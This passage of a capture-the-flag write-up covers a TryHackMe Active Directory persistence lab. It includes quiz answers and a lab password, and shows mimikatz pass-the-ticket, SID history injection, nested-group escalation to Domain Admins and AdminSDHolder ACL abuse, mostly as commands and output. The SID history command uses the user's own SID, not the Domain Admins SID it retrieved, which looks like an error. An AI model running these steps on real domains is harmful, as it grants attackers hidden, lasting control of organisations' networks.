             5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
       
         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             :  za.tryhackme.loc
         UserName                 :  Administrator
         UserRealm                :  za.tryhackme.loc
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED

za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK

mimikatz # exit
Bye! 

za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,914,541,568 bytes free
```
## Task 5  Persistence through SID History
+ What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?`sidhistory`
+ What is the database file on the domain controller that stores all AD information?`ntds.dit`
+ What is the PowerShell command to restart the ntds service after we injected our SID history values?`Start-Service -Name ntds`

```bash
za\administrator@THMDC C:\Users\Administrator\lodwig>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\lodwig> Get-ADUser nicholas.pearson -properties sidhistory,memberof


DistinguishedName : CN=nicholas.pearson,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Nicholas
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : nicholas.pearson
ObjectClass       : user
ObjectGUID        : 5980d4f4-b77d-4297-9784-c6df6259bcc5
SamAccountName    : nicholas.pearson
SID               : S-1-5-21-3885271727-2693558621-2658995185-1138
SIDHistory        : {}
Surname           : Pearson
UserPrincipalName :

PS C:\Users\Administrator\lodwig> Get-ADGroup "Domain Admins"


DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512

PS C:\Users\Administrator\lodwig> Stop-Service -Name ntds -force
PS C:\Users\Administrator\lodwig> Add-ADDBSidHistory -SamAccountName 'nicholas.pearson' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-1138' -DatabasePath C:\Windows\NTDS\ntds.dit
PS C:\Users\Administrator\lodwig> Start-Service -Name ntds
```

## Task 6  Persistence through Group Membership
+ What is the term used to describe AD groups that are members of other AD groups?
+ What is the command to add a new member, thmtest, to the AD group, thmgroup?`Add-ADGroupMember -Identity "thmgroup" -Members "thmtest"`


+ Launch PowerShell
```bash
powershell -ep bypass
PS C:\Users\Administrator> New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "dodol Nest Group 1" -SamAccountName "dodol_nestgroup1" -DisplayName "dodol Nest Group 1" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator> New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "dodol Nest Group 2" -SamAccountName "dodol_nestgroup2" -DisplayName "dodol Nest Group 2" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator> New-ADGroup -Path "OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "dodol Nest Group 3" -SamAccountName "dodol_nestgroup3" -DisplayName "dodol Nest Group 3" -GroupScope Global -GroupCategory Security                                                                      
PS C:\Users\Administrator> New-ADGroup -Path "OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "dodol Nest Group 4" -SamAccountName "dodol_nestgroup4" -DisplayName "dodol Nest Group 4" -GroupScope Global -GroupCategory Security  
PS C:\Users\Administrator> New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "dodol Nest Group 5" -SamAccountName "dodol_nestgroup5" -DisplayName "dodol Nest Group 5" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator> Add-ADGroupMember -Identity 'dodol_nestgroup2' -Members 'dodol_nestgroup1'
PS C:\Users\Administrator> Add-ADGroupMember -Identity 'dodol_nestgroup3' -Members 'dodol_nestgroup2'
PS C:\Users\Administrator> Add-ADGroupMember -Identity 'dodol_nestgroup4' -Members 'dodol_nestgroup3'
PS C:\Users\Administrator> Add-ADGroupMember -Identity 'dodol_nestgroup5' -Members 'dodol_nestgroup4'
PS C:\Users\Administrator> Add-ADGroupMember -Identity 'Domain Admins' -Members 'dodol_nestgroup5'
PS C:\Users\Administrator> Add-ADGroupMember -Identity 'dodol_nestgroup1' -Members 'nicholas.pearson'
```

+ Verify inherit priviledges 
```bash
ssh nicholas.pearson@za.tryhackme.loc@thmwrk1.za.tryhackme.loc

za\nicholas.pearson@THMWRK1 C:\Users\nicholas.pearson>dir \\thmdc.za.tryhackme.loc\c$\Users 
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows 
 Volume Serial Number is 1634-22A9                             
                                                               
 Directory of \\thmdc.za.tryhackme.loc\c$\Users                
                                                               
04/27/2022  07:22 AM    <DIR>          .                       
04/27/2022  07:22 AM    <DIR>          ..                      
01/19/2024  10:20 AM    <DIR>          Administrator           
04/27/2022  07:22 AM    <DIR>          Administrator.TRYHACKME 
03/21/2020  08:25 PM    <DIR>          Public                  
03/21/2020  08:52 PM    <DIR>          vagrant                 
               0 File(s)              0 bytes                  
               6 Dir(s)  51,531,968,512 bytes free 
```

## Task 7  Persistence through ACLs
+ What AD group's ACLs are used as a template for the ACLs of all Protected Groups?`AdminSDHolder`
+ What AD service updates the ACLs of all Protected Groups to match that of the template?`SDProp`
+ What ACL permission allows the user to perform any action on the AD object?`Full Control  `


```bash
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'nicholas.pearson' /p:'Public2000'
```
+ Now, inject the network credentials of the domain administrator into your session. Launch a PowerShell terminal.
```
runas /netonly /user:za.tryhackme.loc\Administrator cmd.exe
```

+ On cmd with injected privilege
```
C:\Windows\system32>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Enter-PSSession -ComputerName thmdc.za.tryhackme.loc
[thmdc.za.tryhackme.loc]: PS C:\Users\Administrator\Documents> Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
[thmdc.za.tryhackme.loc]: PS C:\Users\Administrator\Documents> Invoke-ADSDPropagation
```
+ On Low Privilege powershell
```bash
PS C:\Users\nicholas.pearson> whoami
za\nicholas.pearson
PS C:\Users\nicholas.pearson> Add-ADGroupMember -Identity 'Domain Admins' -Members 'nicholas.pearson'
PS C:\Users\nicholas.pearson> Get-ADGroupmember -Identity 'Domain Admins' | Where-Object {$_.SamAccountName -eq 'nicholas.pearson'}

distinguishedName : CN=nicholas.pearson,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : nicholas.pearson
objectClass       : user
objectGUID        : 5980d4f4-b77d-4297-9784-c6df6259bcc5
SamAccountName    : nicholas.pearson
SID               : S-1-5-21-3885271727-2693558621-2658995185-1138


PS C:\Users\nicholas.pearson> dir \\thmdc.za.tryhackme.loc\C$\Users

    Directory: \\thmdc.za.tryhackme.loc\C$\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/19/2024  10:20 AM                Administrator
d-----        4/27/2022   8:22 AM                Administrator.TRYHACKME
d-r---        3/21/2020   8:25 PM                Public
d-----        3/21/2020   8:52 PM                vagrant

```
## Task 8  Persistence through GPOs
+ What MMC snap-in can be used to manage GPOs?`Group Policy Management`
+ What sub-GPO is used to grant users and groups access to local groups on the hosts that the GPO applies to?`Restricted groups`
+ What tab is used to modify the security permissions that users and groups have on the GPO?`Delegation`

## Task 9  Conclusion
+ `no answer needed`
